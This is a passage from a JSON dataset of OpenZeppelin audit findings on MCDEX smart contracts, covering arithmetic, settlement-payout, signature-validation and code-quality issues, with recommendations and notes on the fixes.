      "content": "In the [`LibEnumerableMap` library](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibEnumerableMap.sol), there are many instances where unprotected math operators are used. For example:\n\n\n* [line 40](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibEnumerableMap.sol#L40) uses `-` operator\n* [line 82](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibEnumerableMap.sol#L82) uses `-` operator\n* [line 91](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibEnumerableMap.sol#L91) uses `-` operator\n* [line 92](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibEnumerableMap.sol#L92) uses `+` and `/` operators\n* [line 111](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibEnumerableMap.sol#L111) uses `-` operator\n\n\nConsider using [`SafeMath`s](https://github.com/OpenZeppelin/openzeppelin-contracts-ethereum-package/blob/release-3.1/contracts/math/SafeMath.sol) corresponding functions instead of unprotected mathematical operators.\n\n\n**Update:** *Fixed in [PR #5](https://github.com/mcdexio/mai-fund-protocol/pull/5).*",
      "summary": "\nA bug report has been filed for the [`LibEnumerableMap` library](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibEnumerableMap.sol) which uses unprotected math operators. This means that when certain operations are performed, the result can be incorrect. The report identified several lines of code which use math operators such as `-`, `+`, and `/`.\n\nThe report recommends using [`SafeMath`s](https://github.com/OpenZeppelin/openzeppelin-contracts-ethereum-package/blob/release-3.1/contracts/math/SafeMath.sol) corresponding functions instead of unprotected mathematical operators. This is because `SafeMath` ensures that the result of an operation is always correct, and it also prevents overflow and underflow errors.\n\nThe bug has since been fixed in [PR #5](https://github.com/mcdexio/mai-fund-protocol/pull/5).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11258",
      "title": "[M01] Function abs breaks for minimum int256",
      "impact": "MEDIUM",
      "content": "Within the [`LibMathEx` library](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibMathEx.sol), the [`abs` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibMathEx.sol#L40) simply [negates any negative values](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibMathEx.sol#L41) passed in.\n\n\nFor unsigned integers in [twos complement format](https://en.wikipedia.org/wiki/Two%27s_complement), there exists one extra negative value than positive value. So, for the minimum value of `int256`, there exists no complementary positive value that can be stored in an `int256`. When this value is passed into the `abs` function, the same negative value will be returned, which should never happen with an absolute value.\n\n\nConsider utilizing the [`neg` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibMathEx.sol#L44) rather than the direct negation ([`-x`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibMathEx.sol#L41)) on line 41. This will revert in the case of the minimum `int256` value.\n\n\n**Update:** *Fixed in [PR #4](https://github.com/mcdexio/mai-fund-protocol/pull/4).*",
      "summary": "\nThis bug report is regarding the `abs` function in the `LibMathEx` library. The `abs` function negates any negative values passed in, but this does not work for the minimum value of `int256` in twos complement format. For this value, the same negative value is returned, which should never happen with an absolute value. To fix this, the `neg` function should be used instead of the direct negation. This bug has now been fixed in Pull Request #4.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11257",
      "title": "[C01] Miscalculation of payout in settle",
      "impact": "HIGH",
      "content": "Within [`SettleableFund.settle()`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/SettleableFund.sol#L204), the variable [`collateralSettled` is calculated as `_rawBalanceOf(_self()) - _totalFeeClaimed`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/SettleableFund.sol#L213). However, the values `_rawBalanceOf(_self())` and `_totalFeeClaimed` are not expressed in the same terms.\n\n\n[`_rawBalanceOf`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/Collateral.sol#L94) returns [`_toRawAmount(X)`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/Collateral.sol#L99), where `X` is either the balance of `account` in terms of the underlying ERC20 token units or wei. When it is [called within `settle()`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/SettleableFund.sol#L213), the value that is passed in will be the address of the `SettleableFund` contract. [`_toRawAmount`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/Collateral.sol#L154) will then [divide this value by `_scaler` and return](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/Collateral.sol#L155). So, the value given back is in terms of `collateralUnits / _scaler`.\n\n\nOn the other hand, `_totalFeeClaimed` is represented in different terms. When the fee is withdrawn by the admins within [`SocialTradingFund.sol`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/SocialTradingFund.sol#L126), while [`_totalFeeClaimed` is decreased by `collateralAmount`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/SocialTradingFund.sol#L133), the amount that is [pushed to the user](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/SocialTradingFund.sol#L138) will be [`_toRawAmount(collateralAmount)`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/SocialTradingFund.sol#L134). [`_toRawAmount`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/Collateral.sol#L154), as we have seen above, [divides `collateralAmount` by `_scaler`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/Collateral.sol#L155) and returns this. So, `_totalFeeClaimed` is accounted in terms of `collateralUnits * _scaler`.\n\n\nClearly, when subtracting these values, we are assuming they are in comparable terms. Really, what happens in the code is that they are NOT in the same terms. `_rawBalanceOf` is in terms of `collateralUnits / _scaler`, while `_totalFeeClaimed` is in terms of `collateralUnits * _scaler`.\n\n\nThe potential implications of this are twofold. In one case, `_totalFeeClaimed` will be much higher than `_rawBalanceOf(_self())`, since it is `_scaler ** 2` orders of magnitude greater. This will cause the [`.sub()`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/SettleableFund.sol#L213) to revert, rendering the `settle()` function useless. The other potential outcome is that `collateralSettled` will be much less than it should be, since `_rawBalanceOf(_self())` will be much lower than it should be. This will translate to [`collateralToReturn`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/SettleableFund.sol#L214) being lower than it should be. Although `shareAmount` of users shares in the fund [will be burned](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/SettleableFund.sol#L215), the amount that is pushed to the user will be `_toRawAmount(collateralToReturn)`, which [will divide the already-too-low `collateralToReturn` value by `_scaler`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/Collateral.sol#L155) once again, and then [transfer that many token units or wei to the user](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/Collateral.sol#L127-L138).\n\n\nSince the [identified location](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/SettleableFund.sol#L213) is the only place in which `_rawBalanceOf` is called, consider changing the logic of [`_rawBalanceOf`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/Collateral.sol#L94) to better suit that application. Instead of calling [`_toRawAmount`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/Collateral.sol#L99), which divides the balance of tokens or wei by `_scaler`, consider calling [`_toInternalAmount`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/Collateral.sol#L145), which [multiplies by `_scaler`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/Collateral.sol#L146). Additionally, consider changing the name of `_rawBalanceOf` to better describe what it does, perhaps renaming it to `_internalBalanceOf`.\n\n\n**Update:** *Fixed in [PR #3](https://github.com/mcdexio/mai-fund-protocol/pull/3).*",
      "summary": "\nThis bug report is related to the code within the SettleableFund.settle() function within the mcdexio/mai-fund-protocol repository. The variable collateralSettled is calculated as the difference between _rawBalanceOf(_self()) and _totalFeeClaimed. However, the values _rawBalanceOf(_self()) and _totalFeeClaimed are not expressed in the same terms.\n\n_rawBalanceOf returns _toRawAmount(X), where X is either the balance of account in terms of the underlying ERC20 token units or wei. When it is called within settle(), the value that is passed in will be the address of the SettleableFund contract. _toRawAmount will then divide this value by _scaler and return. So, the value given back is in terms of collateralUnits / _scaler.\n\nOn the other hand, _totalFeeClaimed is represented in different terms. When the fee is withdrawn by the admins within SocialTradingFund.sol, while _totalFeeClaimed is decreased by collateralAmount, the amount that is pushed to the user will be _toRawAmount(collateralAmount). _toRawAmount, as seen above, divides collateralAmount by _scaler and returns this. So, _totalFeeClaimed is accounted in terms of collateralUnits * _scaler.\n\nWhen subtracting these values, we are assuming they are in comparable terms. Really, what happens in the code is that they are NOT in the same terms. This can lead to one of two outcomes: the _totalFeeClaimed will be much higher than _rawBalanceOf(_self()), causing the .sub() to revert, rendering the settle() function useless; or collateralSettled will be much lower than it should be, leading to collateralToReturn being lower than it should be.\n\nTo fix this bug, consider changing the logic of _rawBalanceOf to better suit that application. Instead of calling _toRawAmount, which divides the balance of tokens or wei by _scaler, consider calling _toInternalAmount, which multiplies by _scaler. Additionally, consider changing the name of _rawBalanceOf to better describe what it does, perhaps renaming it to _internalBalanceOf. This bug has been fixed in PR #3.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11423",
      "title": "[L12] Unclear variable names",
      "impact": "LOW",
      "content": "The variable name `guy` is used frequently throughout the code. To favor explicitness and readability, we suggest renaming all instances of the variable `guy` to `trader` in [`Collateral.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol), [`Position.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Position.sol), in [`Perpetual.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol), [`Exchange.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol), [`ContractReader.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/reader/ContractReader.sol), [`PerpetualProxy.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/proxy/PerpetualProxy.sol) and [`AMM.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol), as well as any corresponding occurrences within interface contracts.\n\n\nAdditionally, in the `LibMath` library [the `_UINT256_MAX` variable](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L230) is declared as `uint256` with value `2**255 -1`. This is not actually the maximum value for `uint256` variables, which is `2**256-1`. This assignment makes sense since the constant is the maximum value that can be represented by an `int256`. Nevertheless, in order to avoid confusion for future developers, consider renaming the variable or adding a comment explaining why this is not the actual maximum representable value.\n\n\n**Update:** *Fixed. The variable `guy` has been renamed to `trader` throughout the code base and `_UINT256_MAX` has been renamed to `_POSITIVE_INT256_MAX`.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11422",
      "title": "[L11] ShareToken contract details",
      "impact": "LOW",
      "content": "The [`decimals`, `name` and `symbol` variables](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/token/ShareToken.sol#L8-L10) of the `ShareToken` contract are explicitly defined. While OpenZeppelin Contracts are already used, consider using the [`ERC20Detailed`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.5.0/contracts/token/ERC20/ERC20Detailed.sol) contract, which contains the additional variables.\n\n\nThis would change `decimals` to a `uint8` instead of a `uint256`, making it consistent with [the standard](https://eips.ethereum.org/EIPS/eip-20).\n\n\nNote that in the [newest package version](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L44-L46) these details of an `ERC20` contract have been included in the main contract.\n\n\n**Update:** *Fixed. `ShareToken` now inherits `ERC20Detailed`.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11421",
      "title": "[L10] Implicit input value assumption",
      "impact": "LOW",
      "content": "In the `LibMath` library the [`wpowi` function](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L106) is assuming implicitly that `n` is non-negative. It actually returns the wrong answer if a negative `n` is used.\n\n\nIn order to avoid wrong returned values, consider validating the input within `wpowi` before executing the calculations.\n\n\n**Update:** *Fixed. The `wpowi` function now specifically accepts only non-negative values of `n`.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11420",
      "title": "[L09] Hard-coded order version",
      "impact": "LOW",
      "content": "In the [`Exchange` contract](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol), the constant [SUPPORTED\\_ORDER\\_VERSION](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L18) is set to the value `2`, but is not used in the code base. However, the function `validateOrderParam` [ensures](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L162) that the orders version is `2`.\n\n\nSince it appears that these two parts of the code are related, consider using `SUPPORTED_ORDER_VERSION` in the [guard condition](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L162). This will ensure that changing this value will impart the expected behavior, and will improve code readability and auditability.\n\n\n**Update:** *Fixed. The order versions hardcoded value of `2` has been replaced by the `SUPPORTED_ORDER_VERSION` constant in the code.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11419",
      "title": "[L08] Use of arithmetic operators instead of LibMath functions",
      "impact": "LOW",
      "content": "Given below is the list of occurrences in the codebase where arithmetic calculations are performed using arithmetic operators instead of using `LibMath` library functions:\n\n\n* [In `ChainlinkAdapter.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/oracle/ChainlinkAdapter.sol#L17) : For calculating the `newPrice`, multiplication is done using the `*` operator rather than using the `LibMathSigned.mul` function\n* [In `InversedChainlinkAdapter.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/oracle/InversedChainlinkAdapter.sol#L18) : For calculating the `newPrice`, multiplication is done using the `*` operator rather than using the `LibMathSigned.mul` function\n* [In `Collateral.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L33) : implements subtraction of `decimals` from `MAX_DECIMALS` using the `-` operator instead of `LibMathUnsigned.sub` function\n* [In `AMM.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol#L554) : multiplication between two integers are performed using `*` operator\n\n\nTo safeguard from code overflows, underflows and arithmetic errors, please consider using [`LibMath`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol) libraries. Also note that the `LibMath` libraries are using `*` and `/` operators instead of relying on their own safe methods. Examples can be found [here](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L223) and [here](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L282)\n\n\n**Update:** *Fixed. Suggested changes have been made.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11418",
      "title": "[L07] Transfer of ETH may unexpectedly fail",
      "impact": "LOW",
      "content": "In the [`_withdraw`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L84) and [`withdrawFromProtocol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L114) functions of the `Collateral` contract, the transfer of Ether is executed with Soliditys `transfer` function, which forwards a limited amount of gas to the receiver. Should the receiver be a contract with a fallback function that needs more than 2300 units of gas to execute, the transfer of Ether would inevitably fail. After the Istanbul hard fork, it has become a [recommended practice not to use `transfer`](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) to avoid hard dependencies on specific gas costs.\n\n\nTo avoid unexpected failures in the withdrawal of Ether, consider replacing `transfer` with the [`sendValue` function](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/utils/Address.sol#L51) available in the OpenZeppelin Contracts library.\n\n\n**Update:** *Fixed. The `transfer` function has been replaced with the `sendValue` function.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11417",
      "title": "[L06] Incorrect guard condition",
      "impact": "LOW",
      "content": "The [guard condition that limits withdrawals from the insurance fund](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L207) compares the raw token value to the scaled WAD balance. Therefore, it doesnt actually protect against withdrawing too much. In practice, the subsequent [sanity check](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L213) will catch any errors. Nevertheless, for clarity, consider updating the guard condition to compare values of the same scale.\n\n\n**Update:** *Fixed. The proper check has been implemented.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11416",
      "title": "[L05] Commented out code",
      "impact": "LOW",
      "content": "The functions [`isEmergency`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/interface/IPerpetualProxy.sol#L46) and [`isGlobalSettled`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/interface/IPerpetualProxy.sol#L48) in the `IPerpetualProxy` contract are commented out without giving developers enough context on why those lines have been discarded, thus providing them with little to no value at all.\n\n\nSimilarly, the functions [`roundFloor`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L135-L141) and [`roundCeil`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L143-L149) in the `LibMathSigned` library are commented out.\n\n\nTo improve the readability of the code, consider removing the commented lines from the codebase.\n\n\n**Update:** *Fixed. Commented code has been removed from `LibMathSigned`. `IPerpetualProxy` contract has been removed altogether.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11415",
      "title": "[L04] Erroneous docstrings and comments",
      "impact": "LOW",
      "content": "Several docstrings and inline comments throughout the code base were found to be erroneous and should be fixed. In particular:\n\n\n* The NatSpec comment on [line 20 of `LibSignature.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibSignature.sol#L20) states that `hash` is the result of an EIP-712 hash, when it can actually be this or a normal [Ethereum hash on a bytes structure](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibSignature.sol#L35).\n* On [line 111 of `AMM.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol#L111), the comment should say `last* functions are calculated based on on-chain fundingState`.\n* The comment on [line 555 of `AMM.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol#L555) appears to be a copy of the comment on [line 551](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol#L551), and should be deleted.\n\n\n**Update:** *Partially fixed. The NatSpec comment in `LibSignature.sol` and the repeated comment in `AMM.sol` have been fixed. However the docstring above the `current*` functions in the `AMM.sol` still mentions that [`current* functions are calculated based on the on-chain fundingState`](https://github.com/mcdexio/mai-protocol-v2/blob/2fcbf4b44f4595e5879ff5efea4e42c529ef0ce1/contracts/liquidity/AMM.sol#L163) instead of `last* functions are calculated based on the on-chain fundingState`*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11414",
      "title": "[L03] Overwriting cash balance",
      "impact": "LOW",
      "content": "The [`setCashBalance` function](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L44) can be used to manually adjust a traders cash balance during the `SETTLING` phase. However, if a separate balance-changing transaction (such as [`deposit`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L93) or [`liquidate`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L291)) is confirmed first, the adjustment will not account for the new balance. Consider replacing the `setCashBalance` function with `increaseCashBalance` and `decreaseCashBalance` functions to avoid the possible race condition.\n\n\n**Update:** *Fixed. The `setCashBalance` function has been replaced by [`increaseCashBalance`](https://github.com/mcdexio/mai-protocol-v2/blob/2fcbf4b44f4595e5879ff5efea4e42c529ef0ce1/contracts/perpetual/Perpetual.sol#L109-L112) and [`decreaseCashBalance`](https://github.com/mcdexio/mai-protocol-v2/blob/2fcbf4b44f4595e5879ff5efea4e42c529ef0ce1/contracts/perpetual/Perpetual.sol#L121-L124) functions.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11413",
      "title": "[L02] Fragile signature verification",
      "impact": "LOW",
      "content": "ECDSA signatures are [inherently malleable](https://bitcoin.stackexchange.com/questions/83408/in-ecdsa-why-is-r-%E2%88%92s-mod-n-complementary-to-r-s), where it is possible to modify a valid signature to produce an equivalent signature over the same data. In Ethereum, this has been [addressed for transactions](https://eips.ethereum.org/EIPS/eip-2), but not for `ecrecover`. Since `LibSignature` [uses `ecrecover` directly](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibSignature.sol#L41) over arbitrary inputs, it will accept these modified signatures as valid.\n\n\nAdditionally, [`ecrecover` returns zero](https://solidity.readthedocs.io/en/v0.6.8/units-and-global-variables.html#mathematical-and-cryptographic-functions) when the signature fails, but this condition is not validated in `LibSignature`. Therefore, it is possible to produce a valid order on behalf of the zero address.\n\n\nAlthough neither of these edge cases can be exploited directly in the current system, it introduces unnecessary fragility. Consider importing and using the `recover` function from [OpenZeppelins ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/cryptography/ECDSA.sol) not only to benefit from bug fixes to be applied in future releases, but also to reduce the codes attack surface.\n\n\n**Update:** *Fixed. A [`recover` function](https://github.com/mcdexio/mai-protocol-v2/blob/2fcbf4b44f4595e5879ff5efea4e42c529ef0ce1/contracts/lib/LibSignature.sol#L52-L66) is added in the `LibSignature` library to remove the reported fragilities by adding checks on `s` and `v`. This function also checks whether the returned value from `ecrecover` is zero. Please note that these checks are based on the OpenZeppelins ECDSA library `recover` function that is [imported in the code](https://github.com/mcdexio/mai-protocol-v2/blob/2fcbf4b44f4595e5879ff5efea4e42c529ef0ce1/contracts/lib/LibSignature.sol#L4) but never used.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11412",
      "title": "[L01] Position size update",
      "impact": "LOW",
